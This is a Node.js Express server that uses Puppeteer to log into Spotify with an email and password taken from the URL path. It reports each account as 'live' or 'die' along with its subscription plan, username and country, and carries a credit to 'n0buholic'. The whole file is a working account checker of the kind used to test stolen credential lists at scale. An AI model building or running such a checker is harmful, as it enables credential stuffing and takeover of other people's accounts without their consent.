const express = require("express");
const app = express();
const puppeteer = require("puppeteer");

app.get("/:email/:password", async (request, response) => {
  var browser = await puppeteer.launch({ args: ["--no-sandbox"] });
  
  var email = request.params.email;
  var password = request.params.password;
  var res = {};
  if (!email || !password) {
    res.success = false;
  } else {
    var data = {email, password};
    
    res.success = true;

    var result = await getResult(browser, data);
    if (result.status) {
      res.data = {
        status: "live",
        plan: result.plan,
        profile: {
          username: result.profile[0].value,
          country: result.profile[3].value
        }
      };
    } else {
      res.data = {
        status: "die",
        plan: "",
        profile: ""
      };
    }
  }
  response.send(res);
});

app.get("/", (request, response) => {
  response.send(
    "How to Use: <pre>localhost/{email}/{password}</pre><div>cr: n0buholic</div>"
  );
});

const listener = app.listen(process.env.PORT, () => {
  console.log("Your app is listening on port " + listener.address().port);
});

async function getResult(browser, data) {
  let url =
    "https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fid%2Fapi%2Faccount%2Foverview%2F";
  return new Promise(async (resolve, reject) => {
    const page = await browser.newPage();
    await page.setRequestInterception(true);

    await page.on("request", req => {
      if (
        req.resourceType() == "stylesheet" ||
        req.resourceType() == "font" ||
        req.resourceType() == "image"
      ) {
        req.abort();
      } else {
        req.continue();
      }
    });

    page.on("response", async res => {
      try {
        if (res.url() == "https://accounts.spotify.com/login/password") {
          if (await res.text()) {
            if (isJson(await res.text())) {
              var json = JSON.parse(await res.text());
              if (json.error) {
                var data = {};
                data.status = false;
                await page.close();
                resolve(data);
              }
            }
          }
        }

        if (res.url() == "https://www.spotify.com/id/api/account/overview/") {
          if (isJson(await res.text())) {
            var json = JSON.parse(await res.text());
            var data = {};
            data.status = true;
            data.plan = json.props.plan.plan.name;
            data.profile = json.props.profile.fields;
            await page.close();
            resolve(data);
          }
        }
      } catch (e) {}
    });

    await page.goto(url);
    await page.waitForSelector("#login-button");
    await page.type("#login-username", data.email);
    await page.type("#login-password", data.password);
    await page.click("#login-button");
  });
}

function isJson(str) {
  try {
    JSON.parse(str);
  } catch (e) {
    return false;
  }
  return true;
}
